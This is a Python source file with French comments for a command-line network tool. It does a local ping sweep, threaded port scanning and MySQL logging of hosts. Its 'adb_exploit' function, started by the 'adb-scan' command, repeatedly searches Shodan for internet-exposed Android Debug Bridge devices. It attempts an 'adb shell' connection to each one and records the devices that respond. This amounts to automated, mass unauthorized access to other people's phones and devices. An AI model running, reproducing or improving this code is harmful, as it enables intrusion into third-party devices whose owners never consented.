import pingthemall as p
import scan_server as s
import os
import ipaddress
from threading import Thread
import mysql.connector
import machine as m
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import time
import shodan
import subprocess

API_KEY = ""

class Server:
    def __init__(self):
        self.devices_up = []
        self.synchronisation_time = 15
        self.machines = []
        self.interface = "" #Définir, l'adresse ip locale.
        self.ip_list = [f"192.168.1.{i}" for i in range(3, 255)]
        self.running = False
        self.db_conn = self.connect_db()
        self.adb_running = False

    def connect_db(self):
        try:
            return mysql.connector.connect(
                host="localhost",
                user="",
                password="",
                database=""
            )
        except mysql.connector.Error as err:
            print(f"Connection à la base de données échouée : {err}")
            return None

    def shodan_query(self, query, api_key):
        adresses_ip = []

        try:
            api = shodan.Shodan(api_key)
            # Effectuer la requête Shodan
            resultats = api.search(query)

            # Parcourir les résultats et extraire les adresses IP
            for resultat in resultats['matches']:
                adresses_ip.append(resultat)

            return adresses_ip

        except shodan.exception.APIError as e:
            print("Erreur Shodan API:", e)
            return None

    def scan_ports(self, ip_address, port_range):
        threads = []
        q = Queue()
        
        for port in port_range:
            thread = Thread(target=s.scan_port, args=(ip_address, port, q))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        ports = []
        while not q.empty():
            ports.append(q.get())

        return ports

    def get_len_machines(self):
        return len(self.machines)

    def get_machines(self):
        with self.db_conn.cursor() as cursor:
            cursor.execute("SELECT * FROM informations_reseau")
            rows = cursor.fetchall()
            self.machines = []
            for row in rows:
                machine = m.Machine(row[1], row[2], row[3])
                self.machines.append(machine)

        return self.machines

    def afficher_machines(self, machines):
        for machine in machines:
            print(f"IP: {machine.ip_address}, MAC: {machine.mac_address}, Ports ouverts: {machine.open_ports}")

    def scan_network(self, interface, ip_list):
        ip = ipaddress.IPv4Address(interface)
        x = 0
        for c in reversed(interface):
            if c == '.':
                break
            x -= 1
        i = interface[:x]
        z = 2
        while z != 255:
            ip_list.append(i + str(z))
            z += 1

        # Créez une seule Queue pour tous les threads
        q = Queue()

        def worker(ip):
            return p.ping_host(ip, q)

        with ThreadPoolExecutor(max_workers=50) as executor:  # Limite à 50 threads en parallèle
            executor.map(worker, ip_list)

        ip_up = []
        while not q.empty():
            ip, result = q.get()
            if result:
                ip_up.append(ip)

        return ip_up

    def delete_db(self):
        with self.db_conn.cursor() as cursor:
            cursor.execute("TRUNCATE TABLE informations_reseau")
            self.db_conn.commit()

    def update_db(self, donnees):
        with self.db_conn.cursor() as cursor:
            insert_query = """ INSERT INTO informations_reseau (adresse_ip, adresse_mac, port) 
            VALUES (%s, %s, %s)
            ON DUPLICATE KEY UPDATE adresse_mac=VALUES(adresse_mac), port=VALUES(port);
            """
            cursor.executemany(insert_query, donnees)
            self.db_conn.commit()

    def synchronisation(self):
        ip_active = self.scan_network(self.interface, self.ip_list)
        donnees = []
        for ip in ip_active:
            mac = p.get_mac_address(ip)
            donnees.append((ip, mac, "???"))
        self.delete_db()
        self.update_db(donnees)

    def background_task(self):
        while self.running:
            self.synchronisation()
            self.machines = self.get_machines()
            time.sleep(self.synchronisation_time)

    def get_adb_history(self):
        adb_history = []
        with self.db_conn.cursor() as cursor:
            cursor.execute("SELECT * FROM adb_ip_addresses")
            rows = cursor.fetchall()
        for row in rows:
            adb_history.append(row[1])
        return adb_history

    def get_adb_last_id(self):
        with self.db_conn.cursor() as cursor:
            cursor.execute("SELECT LAST_INSERT_ID();")
            return cursor.fetchone()[0]

    def put_adb_history(self, data):
        with self.db_conn.cursor() as cursor:
            insert_query = """ INSERT INTO adb_ip_addresses (id, ip_adress) 
            VALUES (%s, %s);
            """
            cursor.executemany(insert_query, data)
        self.db_conn.commit()

    def adb_exploit(self):
        while self.adb_running:
            last_id = self.get_adb_last_id()
            history = self.get_adb_history()
            shodan_query = "Android Debug Bridge Name:"
            devices_list = self.shodan_query(shodan_query, API_KEY)
            for device in devices_list:
                try:
                    subprocess.check_output(['adb', "-H", device["ip_str"], device["port"], "shell"])
                    self.devices_up.append(device)
                except subprocess.CalledProcessError:
                    pass
                adb_id = last_id
            for device in self.devices_up:
                if device["ip_str"] not in history:
                    adb_id += 1
                    data = (adb_id, device["ip_str"])
                    self.put_adb_history(data)
                else:
                    pass

    def start(self, target):
        # Lancer des tâches en arrière-plan, par exemple
        background_thread = Thread(target=target, daemon=True)
        background_thread.start()

class MyShell:
    def __init__(self, server):
        self.server = server
        self.running = True

    def start(self):
        while self.running:
            command = input("---> ")
            self.handle_command(command)

    def handle_command(self, command):
        words = command.split()
        if len(words) == 0:
            return

        cmd = words[0]
        args = words[1:]

        if cmd == "help":
            output = """=== Aide pour les commandes de votre programme ===
            ...
            """
            print(output)
        elif cmd == "clear":
            os.system("clear")
        elif cmd == "scan":
            if len(args) >= 4 and args[0] == "port":
                ip = args[1]
                port_range = range(int(args[2]), int(args[3]))
                ports = self.server.scan_ports(ip, port_range)
                ports_open = ",".join(map(str, ports))
                self.server.update_db([(ip, '', ports_open)])
                self.server.get_machines()
            else:
                print("Usage: scan port [adresse IP] [plage de ports]")
        elif cmd == "status":
            if self.server.running:
                print("Autoscan activé")
            else:
                print("Autoscan désactivé")
            print(f"{self.server.get_len_machines()} appareils trouvés.")
        elif cmd == "connect":
            self.server.connect_db()
        elif cmd == "exit":
            self.running = False
        elif cmd == "hello":
            print("Hello, World!")
        elif cmd == "devices":
            self.server.afficher_machines(self.server.machines)
        elif cmd == "disable":
            if len(args) == 1 and args[0] == "autoscan":
                self.server.running = False
            else:
                print("Usage: disable autoscan")
        elif cmd == "enable":
            if len(args) == 1 and args[0] == "autoscan":
                self.server.running = True
                self.server.start(self.server.background_task)
            else:
                print("Usage: enable autoscan")
        elif cmd == "pingthemall":
            if self.server.running:
                output = input("L'autoscan est activé. Voulez-vous l'arrêter (Y/n) ? ")
                if output.lower() == "y":
                    self.server.running = False
            self.server.synchronisation()
            self.server.machines = self.server.get_machines()
        elif cmd == "adb-scan":
            self.server.adb_running = True
            self.server.start(self.server.adb_exploit)
        elif cmd == "adb-devices":
            devices = self.server.devices_up
            for device in devices:
                print(device)
        else:
            print(f"Commande inconnue : {cmd}")

if __name__ == "__main__":
    server = Server()
    shell = MyShell(server)
    shell.start()